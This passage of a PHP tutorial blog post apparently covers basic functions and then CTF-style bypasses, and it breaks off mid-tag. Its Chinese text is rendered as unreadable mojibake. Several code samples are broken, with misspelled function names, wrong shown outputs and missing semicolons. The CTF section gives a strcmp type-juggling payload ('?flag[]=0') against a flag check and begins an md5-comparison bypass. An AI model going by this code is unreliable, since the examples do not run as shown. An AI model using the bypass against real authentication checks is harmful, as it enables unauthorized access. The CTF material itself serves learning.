    <content type="html"><![CDATA[<p>å¤å¨œæ‹‰é»‘æš—ä¹‹ç¥ğŸª„</p><span id="more"></span><h2 id="PHPåŸºç¡€å‡½æ•°"><a href="#PHPåŸºç¡€å‡½æ•°" class="headerlink" title="PHPåŸºç¡€å‡½æ•°"></a>PHPåŸºç¡€å‡½æ•°</h2><p>æ¥ç€ä¸Šä¸€ç¯‡å°bugï¼ŒæŠŠé‚£äº›ä¹Ÿææºœè¿‡æ¥ç»§ç»­å†™ğŸ§</p><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>extract() å‡½æ•°ä»<strong>æ•°ç»„</strong>ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„<strong>é”®å</strong>ä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„<strong>é”®å€¼</strong>ä½œä¸ºå˜é‡å€¼ã€‚</p><h4 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p><code>extract(array,extract_rules,prefix)</code></p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>arrayï¼ˆæ•°ç»„åï¼‰</td><td>è§„å®šè¦ä½¿ç”¨çš„æ•°ç»„</td></tr><tr><td>extract_rulesï¼ˆæå–è§„åˆ™ï¼‰</td><td>å¯çœç•¥ã€‚<em>extract()</em> å‡½æ•°å°†æ£€æŸ¥æ¯ä¸ªé”®åæ˜¯å¦ä¸ºåˆæ³•çš„å˜é‡åï¼ŒåŒæ—¶ä¹Ÿæ£€æŸ¥å’Œç¬¦å·è¡¨ä¸­å·²å­˜åœ¨çš„å˜é‡åæ˜¯å¦å†²çªã€‚å¯¹ä¸åˆæ³•å’Œå†²çªçš„é”®åçš„å¤„ç†å°†æ ¹æ®æ­¤å‚æ•°å†³å®šã€‚</td></tr><tr><td>prefixï¼ˆå‰ç¼€ï¼‰</td><td>å¯çœç•¥ã€‚è¯·æ³¨æ„ <em>prefix</em> ä»…åœ¨ <em>extract_type</em> çš„å€¼æ˜¯ EXTR_PREFIX_SAMEï¼ŒEXTR_PREFIX_ALLï¼ŒEXTR_PREFIX_INVALID æˆ– EXTR_PREFIX_IF_EXISTS æ—¶éœ€è¦ã€‚å¦‚æœé™„åŠ äº†å‰ç¼€åçš„ç»“æœä¸æ˜¯åˆæ³•çš„å˜é‡åï¼Œå°†ä¸ä¼šå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­ã€‚</td></tr></tbody></table><p><strong><em>extract_rules</em>å¯èƒ½çš„å€¼ï¼š</strong></p><ul><li>EXTR_OVERWRITE - é»˜è®¤ã€‚å¦‚æœæœ‰å†²çªï¼Œåˆ™è¦†ç›–å·²æœ‰çš„å˜é‡</li><li>EXTR_SKIP - å¦‚æœæœ‰å†²çªï¼Œä¸è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚</li><li>EXTR_PREFIX_SAME - å¦‚æœæœ‰å†²çªï¼Œåœ¨å˜é‡åå‰åŠ ä¸Šå‰ç¼€ <em>prefix</em>ã€‚</li><li>EXTR_PREFIX_ALL - ç»™æ‰€æœ‰å˜é‡ååŠ ä¸Šå‰ç¼€ <em>prefix</em>ã€‚</li><li>EXTR_PREFIX_INVALID - ä»…åœ¨ä¸åˆæ³•æˆ–æ•°å­—å˜é‡åå‰åŠ ä¸Šå‰ç¼€ <em>prefix</em>ã€‚</li><li>EXTR_IF_EXISTS - ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œè¦†ç›–å®ƒä»¬çš„å€¼ã€‚å…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚</li><li>EXTR_PREFIX_IF_EXISTS - ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œå»ºç«‹é™„åŠ äº†å‰ç¼€çš„å˜é‡åï¼Œå…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚</li><li>EXTR_REFS - å°†å˜é‡ä½œä¸ºå¼•ç”¨æå–ã€‚å¯¼å…¥çš„å˜é‡ä»ç„¶å¼•ç”¨äº†æ•°ç»„å‚æ•°çš„å€¼ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure> <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º<br>$a = cat;$b = dog;$c = horse<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º2</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>,EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º<br>$a = Original; $b = Dog; $c = Horse; $dup_a = Cat<br></code></pre></td></tr></table></figure><h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3><p><strong>isset()</strong> å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦å·²è®¾ç½®å¹¶ä¸”é NULLã€‚è‹¥ä½¿ç”¨ isset() æµ‹è¯•ä¸€ä¸ªè¢«è®¾ç½®æˆ NULL çš„å˜é‡ï¼Œå°†è¿”å› FALSEã€‚</p><h4 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p><code>bool isset ( mixed $var [, mixed $... ] )</code></p><blockquote><p>$varä¸ºè¦æµ‹è¯•çš„å˜é‡</p></blockquote><p>å¦‚æœä¸€æ¬¡ä¼ å…¥å¤šä¸ªå‚æ•°ï¼Œé‚£ä¹ˆ isset() åªæœ‰åœ¨å…¨éƒ¨å‚æ•°éƒ½è¢«è®¾ç½®æ—¶è¿”å› TRUEï¼Œè®¡ç®—è¿‡ç¨‹ä»å·¦è‡³å³ï¼Œä¸­é€”é‡åˆ°æ²¡æœ‰è®¾ç½®çš„å˜é‡æ—¶å°±ä¼šç«‹å³åœæ­¢ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤ºï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$test</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å˜é‡å·²è®¾ç½®&quot;</span><br>&#125;<br><span class="hljs-comment">//ç»“æœä¸ºtrueï¼Œå°†æ‰“å°æ–‡æœ¬</span><br><br><span class="hljs-comment">//ä½¿ç”¨var_dumpè¾“å‡ºisset()çš„è¿”å›å€¼ã€‚</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;Mod&quot;</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;Modifier&quot;</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//åˆ é™¤å˜é‡a</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-variable">$c</span>=<span class="hljs-literal">NULL</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º<br>å˜é‡å·²è®¾ç½®<br>bool(true)<br>bool(true)<br>bool(false)<br>bool(true)<br>bool(flase)<br></code></pre></td></tr></table></figure><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>file_get_contents() æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contens</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">#è¾“å‡ºæ¼”ç¤º</span><br>This <span class="hljs-keyword">is</span> an example <span class="hljs-keyword">for</span> test<br>(è¾“å‡ºæ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡æœ¬)<br></code></pre></td></tr></table></figure><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><p><code>strcmp()</code>æŠŠä¸¤ä¸ªå­—ç¬¦ä¸²ä»¥äºŒè¿›åˆ¶æ–¹å¼è¿›è¡Œæ¯”è¾ƒï¼Œä¸”è¯¥å‡½æ•°æ¯”è¾ƒæ—¶åŒºåˆ†å¤§å°å†™ã€‚</p><h4 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p><code>strcmp(string1, string2)</code></p><h4 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h4><p>å¦‚æœè¿”å›å€¼å°äº0ï¼Œåˆ™str1å°äºstr2;</p><p>å¦‚æœè¿”å›å€¼å¤§äº0ï¼Œåˆ™str1å¤§äºstr2;</p><p>å¦‚æœè¿”å›å€¼ç­‰äº0ï¼Œåˆ™str1ç­‰äºstr2;</p><blockquote><p>æœ‰èµ„æ–™è¯´è¿”å›å€¼ä¹Ÿä¸ä»…æ˜¯-1å’Œ1ï¼Œä¹Ÿå¯èƒ½æ˜¯å…¶ä»–æ•°æ®</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤ºï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strmp</span>(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);   <span class="hljs-comment">//è¾“å‡º0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-string">&quot;Hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);  <span class="hljs-comment">//è¾“å‡º1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿˜æœ‰ä¸ªå‡½æ•°strcasecmp()ï¼Œç”¨æ³•ä¸strcmp()ç±»ä¼¼ï¼Œåªæ˜¯ä¸åŒºåˆ†å¤§å°å†™</p></blockquote><h3 id="ereg-x2F-preg-match"><a href="#ereg-x2F-preg-match" class="headerlink" title="ereg&#x2F;preg_match"></a>ereg&#x2F;preg_match</h3><p><code>ereg()</code>å’Œ<code>preg_match()</code>æ˜¯PHPä¸­å¸¸ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><p><strong>ç´§æ€¥è¡¥è¯¾â€”æ­£åˆ™è¡¨è¾¾å¼</strong></p><p>åœ¨ç¼–å†™å¤„ç†å­—ç¬¦ä¸²çš„ç¨‹åºæˆ–è€…ç½‘é¡µçš„æ—¶å€™ï¼Œç»å¸¸ä¼šæŸ¥æ‰¾ç¬¦åˆæŸäº›å¤æ‚è§„åˆ™çš„å­—ç¬¦ä¸²çš„éœ€è¦ï¼Œæ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯ç”¨äºæè¿°è¿™äº›è§„åˆ™çš„è¯­æ³•ã€‚</p><p>ä½œç”¨ï¼š åˆ†å‰²ï¼Œ åŒ¹é…ï¼Œ æŸ¥æ‰¾ï¼Œ æ›¿æ¢</p><p>ä¾‹å¦‚ï¼š éªŒè¯é‚®ç®±åœ°å€æ ¼å¼ï¼Œ æ‰‹æœºå·ç æ ¼å¼ç­‰ç­‰</p><h4 id="è¯­æ³•-3"><a href="#è¯­æ³•-3" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><p><code>preg_match(mode, string subject, array matches);</code></p><p><code>ereg(mode,string,subject,array regs);</code></p><p>mode : æ­£åˆ™è¡¨è¾¾å¼</p><p>subject : éœ€è¦éªŒè¯çš„å­—ç¬¦ä¸²</p><p>matches&#x2F;regs : åŒ¹é…åå¾—åˆ°çš„ç»“æœï¼Œä»¥æ•°ç»„çš„æ–¹å¼å­˜å‚¨</p><h4 id="è¿”å›å€¼-1"><a href="#è¿”å›å€¼-1" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h4><p>è¿”å›å€¼æ˜¯<strong>false</strong>æˆ–<strong>true</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º1ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//æ¨¡å¼åˆ†éš”ç¬¦åçš„iæ ‡è®°è¿™æ˜¯ä¸€ä¸ªå¤§å°å†™ä¸æ•æ„Ÿçš„æœç´¢</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æŸ¥æ‰¾åˆ°åŒ¹é…å­—ç¬¦ä¸²&quot;</span>ï¼›<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æœªå‘ç°åŒ¹é…å­—ç¬¦ä¸²&quot;</span>ï¼›<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º1ï¼š<br>æŸ¥æ‰¾åˆ°åŒ¹é…å­—ç¬¦ä¸²<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º2ï¼š</span><br><span class="hljs-comment">//æŸ¥æ‰¾å›ºå®šçš„æŸä¸ªå•è¯</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//æ¨¡å¼ä¸­çš„ \b æ ‡è®°ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œæ‰€ä»¥åªæœ‰ç‹¬ç«‹çš„å•è¯ä¼šè¢«åŒ¹é…ï¼Œè€Œä¸ä¼šåŒ¹é…å•è¯çš„éƒ¨åˆ†å†…å®¹ </span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æŸ¥æ‰¾åˆ°åŒ¹é…å­—ç¬¦ä¸²\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æœªå‘ç°åŒ¹é…å­—ç¬¦ä¸²\n&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is harder than others!&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æŸ¥æ‰¾åˆ°åŒ¹é…å­—ç¬¦ä¸²\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æœªå‘ç°åŒ¹é…å­—ç¬¦ä¸²\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º2ï¼š<br>æŸ¥æ‰¾åˆ°åŒ¹é…å­—ç¬¦ä¸²<br>æœªå‘ç°åŒ¹é…å­—ç¬¦ä¸²<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#å®ä¾‹æ¼”ç¤º3ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// ä»URLä¸­è·å–ä¸»æœºåç§°</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;@^(?:http://)?([^/]+)@i&#x27;</span>,<br>    <span class="hljs-string">&quot;http://shmodifier.github.io&quot;</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<br> <br><span class="hljs-comment">// è·å–ä¸»æœºåç§°çš„åé¢ä¸¤éƒ¨åˆ†</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^.]+\.[^.]+$/&#x27;</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;domain name is: <span class="hljs-subst">&#123;$matches[0]&#125;</span>\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#è¾“å‡ºæ¼”ç¤º3ï¼š<br>domain name is: github.io<br></code></pre></td></tr></table></figure><p><del>ä¹±ä¸ƒå…«ç³Ÿä¸€å †ç¬¦å·æˆ‘ä¸€ä¸ªéƒ½çœ‹ä¸æ‡‚æˆ‘å¥½å¾—å¾ˆå“‡</del></p><h2 id="é­”æ³•éƒ¨åˆ†"><a href="#é­”æ³•éƒ¨åˆ†" class="headerlink" title="é­”æ³•éƒ¨åˆ†"></a>é­”æ³•éƒ¨åˆ†</h2><p>è­¦å‘Šï¼šéº»ç“œè¯·è‡ªè§‰é€€å‡ºğŸš«</p><h3 id="01-strcmpç»•è¿‡"><a href="#01-strcmpç»•è¿‡" class="headerlink" title="01 strcmpç»•è¿‡"></a>01 strcmpç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midiferç»ˆå°†å¦ææ³°æ¥&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], FLAG) == <span class="hljs-number">0</span>) &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç›¸ä¿¡æˆ‘:&quot;</span> . FLAG;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>psï¼šä»wsé‚£é‡Œcopyæ¥çš„ï¼ˆx</p><h4 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>æ¡ä»¶æ˜¯<code>strcmp($_GET[&#39;flag&#39;], FLAG) == 0</code>ï¼Œå°±æ˜¯è¦**$_GET<strong>å˜é‡å’Œ</strong>FLAG**ç›¸ç­‰ï¼Œä½†æ˜¯æˆ‘ä»¬é™¤äº†ä¸¥åˆ‘é€¼ä¾›å‡ºé¢˜äººï¼Œæ ¹æœ¬å°±ä¸çŸ¥é“FLAGæ˜¯ä»€ä¹ˆã€‚</p><blockquote><p>$_GET[â€˜flagâ€™]æ„æ€æ˜¯ä»urlè·å–ä¸€ä¸ªå«flagçš„GETå‚æ•°</p></blockquote><p>ä¸è¦å®³æ€•ï¼</p><p><strong>å½“ strcmp() æ¯”è¾ƒå‡ºé”™æ—¶ä¼šè¿”å› NULLï¼›è€Œè¿”å› NULL å³ä¸ºè¿”å› 0</strong>ï¼Œæˆ‘ä»¬åªéœ€è¦palyloadä¸€ä¸ªéå­—ç¬¦ä¸²å˜é‡å’Œå­—ç¬¦ä¸²FLAGæ¯”è¾ƒå°±ä¼šå‡ºé”™å¹¶è¿”å›0ã€‚</p><p>æ¬¸ï¼Œç›¸ç­‰è¾£ï¼</p><p><strong>æœ€ç»ˆpalyload</strong>ï¼š <code>?flag[]=0</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-02-28_21-02-17.png"></p><h3 id="02-md5ç»•è¿‡"><a href="#02-md5ç»•è¿‡" class="headerlink" title="02 md5ç»•è¿‡"></a>02 md5ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#é¢˜ç›®æºä»£ç ï¼š</span><br><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midiferç»ˆå°†å¦ææ³°æ¥&#x27;</span>);<br> <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>]) &#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç›¸ä¿¡æˆ‘ :&quot;</span> . FLAG;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-1"><a href="#è§£é¢˜æ€è·¯-1" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>æ¡ä»¶æ˜¯<code>($_GET[&#39;s1&#39;])!=$-GET[&#39;s2&#39;] &amp;&amp; md5($GET[s1])==$_get[&#39;s2&#39;]</code>ï¼Œå°±æ˜¯å˜é‡s1å’Œs2<strong>ä¸èƒ½ç›¸ç­‰</strong>ä½†æ˜¯ä»–ä»¬çš„<strong>md5è¦ç›¸ç­‰</strong>ã€‚</p><p>å› ä¸ºs2å’Œs2ä¸èƒ½ç›¸ç­‰ï¼Œæ‰€ä»¥å•çº¯md5åŠ å¯†å¾—å‡ºçš„å¯†æ–‡ä¸€å®šä¹Ÿä¸å®Œå…¨ä¸€æ ·ï¼Œè¿™æ—¶å°±è¦åˆ©ç”¨ä¸€äº›æ­ªé—¨é‚ªé“<del>ï¼ˆä¸æ˜¯ï¼‰</del>ã€‚</p><p><strong>ç´§æ€¥è¡¥è¯¾â€”md5</strong></p><p>md5ä¸€ç§å¯†ç æ•£åˆ—å‡½æ•°ã€‚MD5ç®—æ³•çš„åŸç†å¯ç®€è¦çš„å™è¿°ä¸ºï¼šMD5ç ä»¥512ä½åˆ†ç»„æ¥å¤„ç†è¾“å…¥çš„ä¿¡æ¯ï¼Œä¸”æ¯ä¸€åˆ†ç»„åˆè¢«åˆ’åˆ†ä¸º16ä¸ª32ä½å­åˆ†ç»„ï¼Œç»è¿‡äº†ä¸€ç³»åˆ—çš„å¤„ç†åï¼Œç®—æ³•çš„è¾“å‡ºç”±å››ä¸ª32ä½åˆ†ç»„ç»„æˆï¼Œå°†è¿™å››ä¸ª32ä½åˆ†ç»„çº§è”åå°†ç”Ÿæˆä¸€ä¸ª128ä½æ•£åˆ—å€¼ã€‚</p><p><del>è¡¥ä¸äº†æˆ‘çœ‹ä¸æ‡‚</del>ğŸ¥²</p><h5 